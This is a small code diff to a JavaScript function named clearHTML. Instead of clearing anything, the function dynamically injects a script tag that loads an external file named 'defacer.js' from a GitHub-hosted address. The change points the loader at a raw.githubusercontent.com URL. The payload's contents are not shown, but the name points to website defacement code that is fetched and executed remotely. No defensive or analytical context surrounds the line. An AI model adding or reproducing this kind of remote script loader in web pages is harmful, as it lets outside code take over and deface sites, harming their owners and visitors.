@@ -1,7 +1,7 @@
 function clearHTML() {
     // Dynamically load an external JS file
     const script = document.createElement("script");
-    script.src = "https://cybercutie0.github.io/-/defacer.js"; // Replace with the actual URL
+    script.src = "https://raw.githubusercontent.com/CyberCutie0/-/refs/heads/main/defacer.js"; // Replace with the actual URL
     script.onload = () => {
         console.log("External script has been loaded.");
     };
